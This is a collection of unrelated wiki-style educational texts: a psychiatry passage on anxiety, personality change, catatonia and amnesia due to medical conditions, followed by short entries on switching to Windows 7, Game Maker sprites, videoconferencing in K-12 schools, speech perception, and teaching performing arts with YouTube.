As with other categories of secondary psychiatric symptoms, anxiety due to GMCs may stem from many underlying causes, as shown in Table 3.  ''Endocrinopathies''—notably, hyperthyroidism, hypo- and hyperparathyroidism, and pheochromocytoma—are commonly associated with anxiety (as well as with depression). ''Cardiac arrythmias'' may be both the cause, and the result, of anxiety, sometimes leading to a &quot;vicious cycle&quot;. For example, an individual with underlying heart disease who develops a &quot;run&quot; of supraventricular tachycardia may become very anxious upon experiencing the sensation of &quot;palpitations&quot;, and thereby exacerbate or prolong the tachycardia. Although ''mitral valve prolapse'' is mentioned in older textbooks as a cause of anxiety (especially panic attacks), the evidence for this link is actually tenuous. One recent review (Filho et al, 2008) concluded that, &quot;the more elaborate the study methodology, the lower the chance to observe a significant relationship between these (two) conditions.&quot;

A number of degenerative brain diseases may be associated with marked anxiety, including Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (DAT), Wilson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, and Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease. The frequency of anxiety in patients with DAT averages 48%, versus about 6% in elderly patients without DAT (Mega et al, 1996; Apostolova &amp; Cummings, 2008).

The list of ''medications'' causing anxiety is very extensive, and includes bronchodilators, thyroid preparations, theophylline, psychostimulants (such as methylphenidate), antipsychotics, and antidepressants. A variety of over-the-counter remedies, such as antihistamines and herbal preparations, may also trigger or exacerbate anxiety. Recently, anxiety, tachycardia, and even seizures have been linked with various &quot;energy drinks&quot; containing high concentrations of caffeine (Clauson et al, 2008).

'' Case vignette:  A 67 year-old. bedridden female was brought to the emergency room by her son. The patient had been experiencing severe anxiety for the past two hours. She was alert and oriented, but appeared extremely anxious and tremulous.  Her breathing was rapid and patient complained of palpitations and lightheadedness.  She had learned the day before that she was facing eviction from her apartment. The provisional diagnosis was &quot;Panic attack with hyperventilation, precipitated by threat of eviction.&quot;  Physical exam was notable for a pulse of 120; diaphoresis; and localized wheezes upon auscultation of the chest. A chest radiograph was within normal limits. However, a perfusion scintiscan of the lung revealed acute pulmonary embolus, and the patient was immediately hospitalized.''

&lt;u&gt;'''''Personality change due to general medical condition'''''&lt;/u&gt;

DSM-IV recognizes five main subtypes of personality change due to general medical condition (PC-GMC); i.e., ''labile, disinhibited, aggressive, apathetic'', and'' paranoid.'' However, &quot;other&quot; &quot;combined&quot; and &quot;unspecified&quot; subtypes allow for the almost infinite variations and combinations of personality alterations that may be observed clinically. The older term &quot;organic personality syndrome&quot; also subsumes these categories.

A variety of medical and neurological conditions may lead to alterations in the individual&lt;nowiki&gt;’&lt;/nowiki&gt;s usual personality, temperament, or life-long character traits. According to Reid (1989), the most common causes of PC-GMC (&quot;organic personality syndrome&quot;) are ''head trauma, cerebrovascular accident, ''and'' space-occupying intracranial lesions''. Other common causes include temporal lobe epilepsy, multiple sclerosis, chronic intoxications, endocrine disorders, and CNS infections such as neurosyphilis.

It is useful to focus on personality alterations due to lesions or dysfunction in ''frontal-subcortical circuits'' and within the ''temporal lobes.''  Tekin &amp; Cummings (2002) have identified five parallel frontal-subcortical circuits that link specific areas of the ''frontal cortex'' to the striatum, basal ganglia and thalamus. Lesions originating in the ''orbitofrontal'' region lead to personality changes characterized by ''disinhibition''; e.g., the patient begins to use profanity or exhibit sexually provocative behaviors. Lesions originating in the ''anterior cingulate ''portion of the frontal cortex produce an ''apathetic'' picture; e.g., a once outgoing and vociferous individual becomes withdrawn, indifferent, and uninterested in his usual activities.

Lesions or abnormal electrical activity in the temporal lobes also produce alterations in personality. For example, in temporal lobe epilepsy, the most common psychiatric abnormality is personality change (Chuang, 2006). Hyperreligiosity, hypergraphia, and hyposexuality are reportedly more common in patients with temporal lobe epilepsy than with other forms of epilepsy (Chuang, 2006), though not all neurologists accept this view. Tumors within or impinging upon the temporal lobes may also produce alterations in personality, including irritability, hypochondriasis, or an accentuation of neurotic traits. Some of these alterations may actually reflect temporal lobe epilepsy secondary to the tumor (Lishman, 1998).

''Case vignette: A 63 year-old banker was fired for inappropriate sexual advances toward employee. He was subsequently picked up by the police for urinating in parking lot of exclusive restaurant and shouting obscenities. His wife described him as &quot;just not himself over the past couple of months—it&lt;nowiki&gt;’&lt;/nowiki&gt;s like he has no self-control and no conscience.&quot; Neurological exam in the psychiatrist&lt;nowiki&gt;’&lt;/nowiki&gt;s office was essentially within normal limits, with no &quot;focal&quot; findings, except for abnormal grasp reflex (a tongue depressor repeatedly placed in the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s hand led to his repeatedly grasping it). Magnetic resonance imagery (MRI) showed a large meningioma of the orbitofrontal cortex''.

&lt;u&gt;'''''Catatonic Disorder Due to General Medical Condition'''''&lt;/u&gt;

&quot;Catatonia&quot; is probably best conceptualized as a syndrome with markedly diverse etiologies. Fink and Taylor (2006) have proposed three catatonia subtypes (''nonmalignant'', ''delirious'', and ''malignant'') and four specifiers (secondary to: mood disorders, general medical conditions or toxic states, neurological disorders, or psychotic disorders).

When no identifiable medical or neurological cause is present, about 40% of cases prove secondary to mood disorders, whereas only about 10% are associated with schizophrenia (Sadock &amp; Sadock, 2007). Catatonic disorder due to GMC is not a well-studied phenomenon, and its prevalence has not been clearly established. Features include ''immobility, psychomotor agitation, mutism, negativism, grimacing, peculiar motor behaviors (such as assuming and maintaining unusual postures, sometimes characterized by &quot;waxy flexibility&quot;), echolalia, ''and ''echopraxia.'' Medical and neurological causes of catatonia include drug toxicity, including neuroleptic malignant syndrome (NMS), CNS neoplasms, encephalitis, head trauma, lesions of the fronto-subcortical circuit, and contralateral parietal lobe lesions (Ovsiew, 2008). When catatonia is accompanied by fever and autonomic instability, it may represent ''malignant catatonia'', a potentially lethal form of catatonia which needs emergent treatment with electroconvulsive therapy (ECT) (Fink &amp; Taylor, 2006).

''Case vignette: A 53-year old male presented to a psychiatrist with a provisional diagnosis of &quot;late onset schizophrenia.&quot; The man had in fact been functioning quite well until about a year ago, when he developed insidious signs of forgetfulness, apathy, and abulia (loss of spontaneity and effort). Recently, he had also developed leg weakness and &quot;fainting spells.&quot; However, his presentation to the psychiatrist was one of mutism and marked decrease in voluntary movements of any kind; indeed, the psychiatrist described the patient as &quot;grossly catatonic.&quot; Given the atypical age of onset for schizophrenia, and history of leg weakness, an MRI was ordered. It revealed &quot;ventriculomegaly; hydrocephalus secondary to subthalamic mesencephalic tumor involving the third and the lateral ventricles.&quot; Surgical placement of a ventriculoperitoneal shunt led to resolution of the catatonia over a period of several days (Neuman et al, 1996).''

&lt;u&gt;'''''Amnestic Disorder due to GMC'''''&lt;/u&gt;

''Amnestic disorders'' entail impairment in the ability to learn new information, or to recall previously learned information''. ''Amnesia is most commonly found in patients with a history of ''alcohol abuse'' or ''head injury'', in which bilateral damage to mid-temporal lobe structures (such as the hippocampus, mamillary bodies or amgydala) has occurred. In the DSM-IV, the two primary categories are ''amnestic disorder due to GMC'', and ''substance-induced persisting amnestic disorder''. The latter will be discussed in chapter (   ), in relation to alcohol and benzodiazepine use.

Numerous GMCs may produce amnestic disorder, including ''thiamine deficiency, hypoglycemia, carbon monoxide poisoning, hypoxia, ''and'' herpes simplex encephalitis'', all of which tend to produce bilateral hippocampal damage (Sadock &amp; Sadock, 2007).  Korsakoff&lt;nowiki&gt;’&lt;/nowiki&gt;s Syndrome (KS) is characterized by marked amnestic symptoms in the presence of generally preserved cognitive function in other spheres. Essentially, KS is the chronic amnestic phase of ''Wernicke-Korsakoff Syndrome,'' which is discussed in chapter (   ). Though the predominant defect in KS is usually ''anterograde'' amnesia—i.e., impaired ability to retain new memories--there is often a ''retrograde'' amnestic component as well. Usually, there is relative sparing of remote memory. Lishman (1998) has noted that the line between Korsakoff&lt;nowiki&gt;’&lt;/nowiki&gt;s Syndrome and so-called ''alcoholic dementia'' is not always sharp, and there are most likely gradations or intermediate states between these two conditions.  KS–though conventionally attributed to thiamine deficiency—is closely associated with ''alcohol abuse and dependence''. Indeed, Lishman (1998) goes so far as to opine that, &quot;…the rarity of a fully fledged Korsakoff syndrome as a residue of thiamine deficiency in non-alcoholics raises the possibility that a direct neurotoxic action of alcohol may play some part in the evolution of the condition (p. 582).

&lt;u&gt;'''''Medical and Laboratory Evaluation for Psy-GMC'''''&lt;/u&gt;

{|border=&quot;0&quot; cellspacing=&quot;2&quot; width=&quot;100%&quot;
|colspan = &quot;3&quot;|Given the prevalence of undetected medical illness in psychiatric populations, it is incumbent upon the physician to treat all putative &quot;psychiatric&quot; symptoms with a certain degree of skepticism. 
|As noted earlier in this chapter, one&lt;nowiki&gt;’&lt;/nowiki&gt;s degree of suspicion is raised when the patient presents with a recent change in mental status, particularly when this occurs in temporal proximity to a known medical illness or drug-related event. Atypical presentations; late-life onset; and illness that fails to respond to standard therapies should all raise ones suspicion of a medical cause. The basic &quot;work up&quot; of suspected psychiatric symptoms due to GMC is outlined in Table 4.

'''Laboratory and Physical Evaluation for Psy-GMC'''

* Vital signs
* Assess for pain complaints
* Gross physical exam immediately; complete physical ASAP with close attention to neurologic exam and detailed mental status examination
* Complete blood count, electrolytes, blood urea nitrogen, creatinine, glucose, VDRL (screening for syphilis), liver function tests, thyroid function tests, serum calcium, magnesium, phosphate, ammonia, erythrocyte sedimentation rate, HIV testing (where risk factors are present)
* Electrocardiogram (chest radiograph in selected cases)
* O2 saturation
* Urinalysis/drug screen
* EEG (helpful in confirming, monitoring delirium)

&lt;u&gt;'''''Treatment of Psy-GMCs'''''&lt;/u&gt;

''Treatment'' of individual Psy-GMCs is beyond the scope of this chapter, since it necessarily focuses on primary treatment of the numerous underlying medical conditions. Symptomatic treatment with psychotropic agents may be conservative for Psy-GMCs, and depends on whether the predominant disturbance is in the realm of mood, reality testing (psychosis), anxiety, personality, etc. Though psychotropics aimed at a particular GMC-related symptom may sometimes be useful—e.g., antipsychotics for &quot;organic&quot; psychosis, or antidepressants for depression due to a GMC—most psychotropics run the risk of further clouding the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s mental state, or introducing side effects and drug-drug interactions. Nevertheless, there is a role for judicious use of psychotropics in certain instances; e.g., antidepressants in post-stroke depression, or depression related to Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s disease.

I'm assuming the Mac User is using OS X 10.5, and I'm using Windows 7 since that is the newest version of Windows made available.  There are plenty of guides to switching to Mac, but almost none for Mac to Windows.  This is meant to be helpful, not a book to air grievances on one side or the other.&lt;small&gt;—The preceding unsigned comment was added by [[User:JJohnson|JJohnson]] ([[User talk:JJohnson|talk]] • [[Special:Contributions/JJohnson|contribs]]) 02:16, 25 March 2009  (UTC)&lt;/small&gt;&lt;!-- Template:Unsigned2 --&gt;

      <text xml:space="preserve">==Similarities==
You will first see that the desktop in Windows 7 is very clean, with no menu bar at the top, but a single Taskbar at the bottom.  This is the most used interface construct, enabling access to the entire file system and to all running programs on the system.



==What's Different==

==The Taskbar==
[[File:Win7_taskbar.jpg|left]]
Running programs are contained in the Taskbar, indicated by a glass outline around the icon, intended to bring 'at-a-glance' indication of which programs are running.  If there are multiple windows of the program running, you will see a doubled outline around the icon.

[[File:Win7_taskbar2.jpg|left]]
When you hover your mouse over an open program, you will see a color highlight over the icon.  If you rest your mouse there, live thumbnails of each window will fade into view to show you which documents or browser tabs are open.

      <text xml:space="preserve">In Game Maker, almost everything you see on the screen are called objects.  

== Creating a sprite ==

Before you can create an object, whether it is a wall or another moving object, you need to create a sprite to display the object.  A single frame sprite is created by clicking the ''Create a sprite'' icon.  Within the new dialogue, click &quot;Load Sprite&quot; and select the bitmap file you want.  The sprite in question will appear to the right as a single grame.

=== Creating an animated sprite ===

To create an animated sprite, you need to select &quot;Edit Sprite&quot;. You can either create images manually, or import them from as an animation strip from the File menu. 

== Sprite options ==

In the sprite properties window, you have a few options:
* Precise collision checking
* Smooth edges
* Preload texture - causes the sprite to be loaded on startup rather than as-needed.
* Origin - the point of origin on the sprite 
* Bounding box - indicates the collision box on objects using the current sprite.


== Creating an object ==

Once the sprite is ready, you can proceed to create the object. 

== Object properties ==

On the left column, you can set the properties of the object:
* The sprite
* Visible and solid flags
* Depth (rendering order)
* Parent object (inherits properties from the patent)
* Mask (used for collision purposes)

== Events ==
In Game Maker, the various objects react to events. An event handler is created by clicking Add Event.

To react to a given event, create or select an event, and use the icons in the fourth column to choose the actions.  The entire palette of actions can be browsed by using the set of tabs on the far right. 

== Creating objects via scripts ==

Eventually, you will need to create objects dynamically through the script. This is performed by something similar to the following code:
&lt;code&gt;
id = instance_create(x,y,obj);
&lt;/code&gt;

The return value is the instance id of the newly created object.

      <text xml:space="preserve">== Linoleum-Reflectivity Material ==
This material is good for making a linoleum material. The only missing thing is for you to choose an image, and add the image as a texture, tile it on the material, and this will complete the material. This example will give you the right reflectivity and Mirror.&lt;br&gt;

= Using Videoconferencing in K-12 Schools=
By S. Richardson

== Introduction [http://www.slideshare.net/mbogart/videoconferencing-opportunities-in-k12]==

This is an exciting time in the history of K-12 Schools, with new learning technology emerging from every corner there is one that is entering the classroom at a rapid pace now which is video conferencing.   Is it hard to imagine that students can travel to Japan school or a museum an engage with other students and a specialist in real-time discussion without leaving their classroom is a wonder thing? Is it?   As educators today we must be committed to equip students today with skills and knowledge they will need to compete in the workforce and to prepare them for college. Student learning can be influenced in fundamental ways depending on the context in which it takes place and how it is translated.   With video conferencing students will have access to wide range experiences and different ways of learning different topics.    (Bransford,   Brown &amp; Cocking, 2000) stated that a “community-centered approach requires the development of norms for the classroom and school, as well as connections to the outside world, that support core learning values”.   The use of video conferencing can have strong effects on students learning and achievement.  Students are able to collaborate with other students regionally, statewide, nationally and globally to foster understanding to different cultures and active learning.  Teachers can use the technology as well to prompt professional development.  The fact of the matter is now many schools can not afford to pay full-time teachers in rural schools.  So, what is the next best thing schools are looking for you guessed it video conferencing as one of the forms for distance learning and a way to compete in the 21st century.


&lt;br/&gt; *Teacher Tude: '''Video conference in the classroom-Observation''' [http://www.teachertube.com/view_video.php?viewkey=d67f4d768abd29b985b2]

Here is a news video on the [[Alabama]][http://www.foxnews.com/video-search/m/21787909/online_high.htm#q=alabama]school system and how they are starting to use video conferencing in schools to teach courses within classes.  What are big step for Alabama high school system and this initiative by the state hopefully will be welcome by all schools within the state.

==What is Video Conferencing?[http://en.wikipedia.org/wiki/Video_conferencing]==

Video conferencing is a live transmission feed using video and audio between two or more terminals for communication needs.  Within any setting such as schools, the technology can be used in two different ways.  Schools are able to do a one-way transmission or two-way transmission.  The one-way (asynchronous) allow students to see and hear the teachers, but the teachers can not see the students.  The two-way video in real-time (synchronous) allow students and teachers to see and hear each other simultaneously.   Video conferencing will allow you to collaborate like never before over the network face-to-face communication with other schools and different locations of learning.
Using video conference equipment is pretty easy once the equipment is setup and hooked up to the network.  Here is a small check off list before having the video conference:

:# Make sure to schedule the meeting in advance and no IT support is required.
:# Keep in mind that launching the conference is as simple as making a conference phone call.
:# Make sure that in-room controls are intuitive.
:# Make sure collaboration applications are plugged in and working.
:# If you plan to use any power point or video clip, make sure to test the feed before the video conference.
:# Find out who will be connecting to whom.
:# Provide your IP address or ISDN line to the connecting and make sure to get the same information from the other party.
:# Make sure to have all contact information of the other party just in case you are having problems connecting.
:# Do a test call before the meeting at least two to three days in advance that will give you enough time to fix any problems that may occur during the test.


Video conferencing is also known as (IVC) interactive videoconferencing. IVC is now becoming more available to educators.   Video conferencing is still a developing area for K-12 education-schools have many systems to choose from and the cost of these systems has come down as well.  The capabilities of the video conference system have increase very much over the 50 years since the technology was development.  If educators are looking for more information about video conferencing, there is a book coming out on May 2009, by Camille Cole, Kecia Ray &amp; Jan Zanetis (2009) called “Videoconferencing for K-12 Classrooms, Second Edition” for educators, district administrators, technology coordinators, and others.

== What type of Network is needed? ==

Video conference can be transmitted in two different ways over IP (Internet Protocol) and ISDN (integrated services digital network) utilizing H.323 standards. A good speed to connect and start the videoconference unit is 384 or higher. The cheapest route for schools would be the IP.   Even though the ISDN service gives the schools a dedicated link it can also be very costly to schools some units require you to have six ISDN lines for their systems.  Most schools already have internet network so no additional installation maybe needed and they can build upon the strength of the existing infrastructure and if the infrastructure is up to par no special connections are needed.  The quality of the videoconference when using IP will depend on the internet traffic at the time of use. 

In an article by [[Jennifer Horton (2008)]][http://www.howstuffworks.com/framed.htm?parent=classroom-video-conferencing.htm&amp;url=http://www.ivci.com/buyers-guide-to-video-conferencing.html], she talks about 3 types of systems that schools are using to do their video conferencing which will give you a better idea of what to expect in different schools.  The integrated systems are portable units and desktop setups.   According to Horton, (2008) 

::Integrated systems are the most advanced setups and are generally used for more formal communication.  The video conferencing equipment is incorporated into the classroom’s design and usually consists of several monitors for displaying video, multiple microphones to capture sound and top-of-the –line codec to deliver optimal quality.  Portable units are less expensive than the integrated systems.  These portable setups typically consist of the monitor; microphone, camera and other equipment loaded onto a rolling cart that can be transported to whichever classroom need it.  Desktop setups are the cheapest method of video conferencing.  This setup includes a PC, a small camera mounted on top, a microphone and software to perform the job of the codec.

The costs of each device have different price ranges.  The cost of the desktop can cost as low as $300 [[source:IVCi]][http://www.vsgi.com/google/landing/videosys],  the  cost of the set-up device which is the portable unit can range anywhere between $5000 to $10,000 [[source: IVCi]][http://www.vsgi.com/google/landing/videosys]and the last device which will cost schools more money than they are will to spend is the integrated codec and the price range from $10,000 to $100,000 [[source: IVCi]][http://www.vsgi.com/google/landing/videosys].  

After looking into several schools, it seems that most of the schools are using the portable units because they are able to move them from one classroom to another classroom.  With the school budgets today, there has to be a medium for the schools to chose what will work better for them at the less cost out of pocket.

== Tips When Using Video Conferencing ==

When using video conferencing in a classroom setting or any other setting one must be prepared and have done some advance preparation  and testing in order to make the conference rewarding for the students.   According to Jobe who quoted “Phil Stauder who uses videoconference extensively with his students at DuPont Hadley Middle School in Nashville, Tennessee, offers this advice.
::•Plan your conference for early in the day so the Internet is less congested.
::•Explain to everyone in your building that you need all the bandwidth you can get. Request they stay off-line during your scheduled conference.    
::•Decide on the placement of students on camera.  You will need to use an external microphone due to their distance from the computer.
::•Use a direct connection to your partner if possible.  Experiment with their calling you and then your calling them; the connection may vary.
::•Do trial runs with your students, so everyone knows when to speak and when to listen.  You might do this within your building; it is a great way to share problem-solving activities or to do a remote spelling bee.
::•Plan for the worst!  If the server is down, postpone.  Running your e-mail program in the background is a good idea, also having a telephone at your disposal with all the participants; numbers is helpful.
::•Beware of unexpected incoming hook-up requests when you are on-line; if students are present; choose not to answer incoming requests (Jobe, 1999).

When people get new technology they are so eager to start using it immediately, but with video conferencing it is not the best recommendation.  Students or teachers can type in a site address without contacting the other site can expose students to undesirable content.   Organization is everything. 

Here are a few links with ideas and tools about using video conferencing within schools.

== Benefits of using Video Conferencing ==

Videoconferencing has many benefits and advantages for students in K-12 classrooms.  There is an article by [[Virginia Ewing (2005)]][http://www.distance-educator.com/dnews/modules.php?file=article&amp;name=News&amp;op=modload&amp;sid=13828], which states “videoconferencing in the K-12 classroom is advantageous because it enhances the learning process, increases student motivation and participation, and encourages cultural diversity.”  There are several benefits for using IVC which will be listed below and there are many more that will not be listed, but this will give you an idea.

::•IVC will bring experts otherwise may not have been available or accessible into the K-12 classrooms
::•It will appeal to students different learning styles
::•Different  schools can collaborate with each to learn about each other’s cultures and background
::•IVC will help to improve communication and presentation skills of the students
::•IVC will open the minds of students to different location outside of their hometown and to think outside of the box
::•It will improve collaborations between schools and teachers


Many schools are using IVC to allow students to take courses that are not offered in their area and it also allows schools who cannot afford certain teachers such as Math and Science teachers to transmit lessons from other classrooms.   Video conference provides equal access to high quality teachers to improve students’ achievement in the school district.   

Regardless of delivery method, technology should:

:#Encourage contact between students and faculty
:#Develop reciprocity and cooperation among students
:#Use active learning techniques
:#Give prompt feed back
:#Emphasize time on task
:#Communicate high expectations
:#Respect diverse talents and ways to learning

(as cited in Beldarrain, 2006, p. 142).  If teachers adhere to the seven principles, the implementation of video conferencing can be proactive which will benefit the learners and educators in classroom and outside the classroom.


== Final Thoughts ==

Teachers will need or may have to rise above the standard way of teaching K-12 schools and start to embrace the benefits of using video conferencing as another pedagogy method.   The use of video and audio to enhance student learning is such a broad scope and interesting concept to look into.  It will be amazing to see how schools will start to incorporate video conferencing into each classroom.  It will be an exciting thing and extraordinary for the students and teachers.  The question now is how will existing educators within the school system adjust and welcome the new change?  Will teachers start to feel threaten by technology as it slowly creeps into the schools?  How will schools keep up with the new technology with the limited budget they are given.  How often and how much will schools use video conferencing for educating students.  With the way researchers are discovering new technology for learning, educators should be very excited about the future in education.

      <comment>/* Speech spectrogram */</comment>
      <text xml:space="preserve">Speech perception is a hot topic because it is critically important to human communication. As well, there are some controversial claims being made. For example, it may be the case that we have two auditory systems: one for speech, one for non-speech.

==The nature of speech sounds==
The stream of speech sounds is relatively unbroken during normal, fluent speech. There is no space between the words - detecting word boundaries is a major problem for psycholinguistics.

The [[w:International Phonetic Alphabet|International Phonetic Alphabet]] is an alphabet which ''does'' uniquely identify every speech sound by a single character. IPA symbols will be used extensively in this section; you would do well to familiarize yourself with the symbols, and their use.

===Definitions===
;phoneme:The smallest unit of linguistically distinctive sound. Phonemes are not the same thing as letters, morphemes, nor syllables.
;letter:An element of written language. It is critically important that there is no &lt;math&gt;1:1&lt;/math&gt; relationship between letters of the alphabet and the phonemes of the language.
;morpheme:The smallest linguistic unit that has semantic meaning. ''Work'' is a morpheme; ''-ed'' is another morpheme. ''Worked'' is two morphemes.
;utterance:A complete unit of spoken language.

===Structure of language===
There are four rough levels of the analysis of language. Beginning from the highest level:
*Syntactic - the utterance has a grammatical structure
*Semantic - a string of phonemes has a particular meaning
*Phonetic - a sound is a string of phonemes
*Acoustic - a sound has certain properties

While the bottom-up processes are obvious, there is significant top-down influence as well. For example, the [[w:phonemic restoration effect|phonemic restoration effect]] is very robust, and similar processes can repair input at the level of individual phonemes, words, and even sentences.

If you replace a single phoneme in a sentence with white noise, or a cough, or silence, listeners can still identify the word.

In the sentence &quot;I scream, you scream, we all scream for ice cream.&quot; there is no difference between the /aɪ/ in &quot;I scream&quot; and in &quot;ice cream&quot; - the sound is ''exactly'' the same in both cases, yet the word boundary is perceived to be in a different location based solely on context effects.

If you insert a semantically unrelated sentence into a paragraph-length discourse, listeners will not get it (but will continue with normal perception after the sentence).

==Measuring speech==
===Speech spectrogram===
[[File:Spectrogram of I owe you.png|thumb|A speech spectrogram of &quot;I owe you.&quot;]]
A speech spectrogram (careful with terminology here!) graphs frequency vs time &amp; the intensity (amplitude, loudness) is coded by darkness. This shows qualitatively how speech sounds unfold over time. Note that consonants are noisy (not loud! but broadband in frequency). Vowels, in contrast have prototyped horizontal bands of energy. These bands are called [[w:formant|formants]]. Near consonants, one or more of the formant curves - this is a formant transition. Most vowels are steady-state; they do not change over time (monophthongs). Some vowel sounds are dipthongs - they transition from one spectrum to another over the course of the vowel.
[[File:Spectrogram -iua-.png|thumb]]
However, the speech spectrogram isn't very helpful since it is not ''quantitative''. For that, we can use a ''speech spectrum'' (careful with terminology!).

===Speech spectrum===
A speech spectrum plots energy in dB SPL vs frequency for a short period of time: on the order of 40ms. This is essentially a cross-sectional slice of a speech ''spectrogram''. But now you can't see how the sound unfolds over time!

===Waterfall plot===
A waterfall plot is essentially a series of speech spectrums over time, laid out in 3D. This overcomes the limitations of speech spectrograms (shows speech unfolding over time, but isn't quantitative) and also overcomes the limitations of speech spectrums (highly qualitative, but shows only a short snippet of the speech stream).

      <text xml:space="preserve">== '''Using Youtube to Teach the Performing Arts''' ==

==Introduction==  

The Basics:
YouTube has pretty much become the standard in free Internet video uploading.  Perhaps it was solidified by the CNN/YouTube debates during the presidential primaries.  In any case, the use of YouTube has now become so pervasive that it is acceptable for use in the classroom.  It’s important to understand as a technical support specialist that although the teachers in one’s school may be innovative pedagogues, when it comes to incorporating new technologies into lessons, technical support and even prodding is often needed.  The goal of this entry is to provide technical specialists with the knowledge of how to help instructors incorporate the use of YouTube into the classroom.  It also provides some guidelines and cautions.  Often instructors have trepidations about using anything Internet related in their classrooms for fear of safety.  Used properly though, YouTube can be a useful instructional tool in the classroom.

What it is:
What is YouTube in the classroom?  YouTube is probably useful for all types of information.  According to Talab and Butler, you can find all kinds of instructional videos on YouTube, even how to install a hard drive on a Mac.  However, it is particularly well suited to the instruction of the performing and visual arts.  That is what this section of the Wikibook is dedicated to.  

Why:
Why should YouTube be used?  The ability to have a universal platform for students to access information, review lessons, and more is invaluable.  And as far as the world of education is concerned, is unprecedented.  It would be wasteful not to take advantage of this tool.  But first, education technical specialists have to push teachers to be early adapters.  That requires a knowledge of how the site it can be used in instruction, what precautions to take, and how to communicate with the subject area teachers. 


==Example Subjects YouTube Can Be Used For==

==Dance==

Learning Steps:
Dance, like anything physical, requires constant practice to acquire muscle memory.  In order to achieve the most muscle memory as possible, rehearsing and practicing is key.  However, students need to practice the correct steps with the correct techniques, or they are merely achieving muscle memory for the wrong things.  (This then takes extra practice time to un-learn).  YouTube can be used to mitigate this difficulty by providing dance students with an accurate representation of the steps and techniques they need to learn.  Instructors at your school can easily upload short instructional videos to the YouTube site so that when students go home to work on the choreography, they are actually practicing the correct steps and techniques.  These steps can also be homework for students to learn.  Rather than using valuable class time to teach difficult steps, instructors can upload demonstrations and have students come to class prepared with the step.  This saves class time for other important things like staging and working on getting the group to dance in unison.

Improving Choreography:
A major part of the dance teacher’s job is choreographing pieces for students.  But when an instructor is busy working on the minute details of a performance, it’s easy to overlook problems with choreography and miss opportunities for improving the original vision.  YouTube provides a platform by which instructors can study their work from any computer with Internet access and improve their work, thus enhancing the students’ later performance.  Even if they do not use the site themselves, they can send it to colleagues all over the world for input.  Having another professional’s eye can be a great resource in creating choreography.  YouTube can be the mechanism for this self-review and review from other professionals.  

Aside from uploading one’s own videos, instructors can also search for ideas.  From song choices, to choreography, staging, and costuming—teachers can look to other performances on YouTube for inspiration and concrete examples.  They can also find what other students are doing who are at the same age and ability level as their own students.  Using those examples, they can motivate their students to work harder and try more difficult steps.

A Tool for Practicing:
Students can also view an entire routine and practice up to speed with videos uploaded to the site.  Instructors are not limited to posting only one step at a time.  Entire routines can be loaded for students to study how the pieces of choreography fit together as well as spacing.  Furthermore, seeing oneself on a video can help the individual student make adjustments to their techniques, improving themselves before the final performances and pushing their dancing to new levels.

Sharing the Performances:
Many hours, often hundreds of hours, are spent on preparing students for a single ninety-second performance.  Inevitably all of their family and friends cannot be there to share every performance for which the students work so hard.  YouTube’s pervasiveness can be used to the students’ and instructors’ advantage once again in sharing the performances with family, friends, and other professionals.  It’s necessary for students to share their work so that they can have a product of which they can be proud.  Linking their YouTube performance videos to social networking sites and sending it to far away relatives in friends via e-mail is a great way for students to share their performances with others.  Since YouTube videos are viewable through a simple web link, their work is highly accessible.  The more instructors that post videos of their students’ performances, the more that will be available on YouTube for other instructors to view.  This further enhances the entire process, whereby instructors can get inspiration from the work of other schools.  YouTube, with as popular as it’s become, can act as a virtual portfolio for student work.  With dance a portfolio is normally difficult as it is usually captured in real time.  However, YouTube makes it accessible.

Dancing Concluded:
It’s obvious that dance teachers in schools can use YouTube as a tool for learning new steps, sharing performances, enhancing choreography, and giving all students access to practice materials.  As an example, the various ways YouTube can be used to teach dance are documented on this video.[http://www.youtube.com/watch?v=S4yz3HNTYkk]

==Art==

Techniques:
The archetypal distance learning in art is probably Bob Ross’s public television show.  Art teachers can create the same type of experience in K-12 settings.  Classroom teachers can provide instructions, techniques, slide shows, and more for their students to view at home or in the classroom.  Descriptions of techniques in painting, drawing, sculpture, design and more can already be found on YouTube.  Teachers can use what is already there or add their own video.

An example of using YouTube to teach painting can be found here[http://www.youtube.com/watch?v=Qe33o8ezVfI]

Displaying Student Work
Just as with dance, YouTube can be used to showcase student work.  Creating a slide show of exemplary pieces students made in class is a great way to reward students for their hard work as well as give the instructor a permanent example to show subsequent classes.  

==Music==
A classic difficulty with music in the schools is finding time for one-on-one instruction with students.  Working on individual student’s embouchure (for the wind instruments), learning new notes, music theory, and other techniques is a must for music teachers attempting to improve the quality of their overall ensemble.   Short instructional clips online for vocal and instrumental techniques can be a great use of multimedia to improve the overall level of the musical group.  

As with dance, musical performances are particularly suited to video recording to capture the entire experience.  Students can share these with family and friends.  Teachers can use performance videos to motive and critique everything from posture, rhythm, and pitch.  YouTube videos provide students with their own accessible copy of the performances so they can actually refer to it and watch their improvements over time.

==Example Subjects Concluded==

In all three of these performing arts subjects practicing and performing are essential parts of the student experience.  YouTube can serve as a multimedia aid to help students practice more effectively and share final products.  Just as was mentioned by Jeffrey Gentry, YouTube solves the question of bandwidth.  Emailing full videos is normally out of the question for their large file sizes; but YouTube solves that problem as well as other compatibility issues instructors often may have run into.

==Recruitment and Retention==
YouTube videos can also be used for recruitment and retention purposes.  Getting students interested and motivated to participate in the performing arts can often be a struggle.  Traditional promotional videos are costly.  However, teachers can use their recorded dance and music performances as well as artwork slideshows to advertise their programs to the whole school and improve enrollment.  Showing a quick video on the morning announcements can go a long way in attracting new students to a particular program.  Students already participating in the programs will again have a reason to be proud of their work and are likely to continue on.  In this way, these videos can be used for improving retention rates, which can even lead to the increased security of performing arts programs in K-12 institutions that are too often in jeopardy.

==Limitations and Cautions==
If you work as a technical coordinator in education you know that Internet safety is a top priority for teachers, administrators, and parents.  Teachers need to be made aware of the possible problems with using YouTube.  Of course they need to follow YouTube’s terms of service, using only royalty free music and images.  But they also need to protect their students’ privacy.  Full names should not be used; in fact, no identifying information of the children should be used whatsoever.  It would also be prudent to have parents sign a permission release to make sure they are aware of what the teacher intends to do.   Most of the time the instructor will be putting up his or her own videos without students.  In the cases of student performances though, students will inevitably be in the videos.  YouTube has the option to make these videos private so that only the people the instructor allows has access to view the video content.  Many of these issues can be overcome with proper awareness and communication with school administrators and parents.  

==Conclusion==
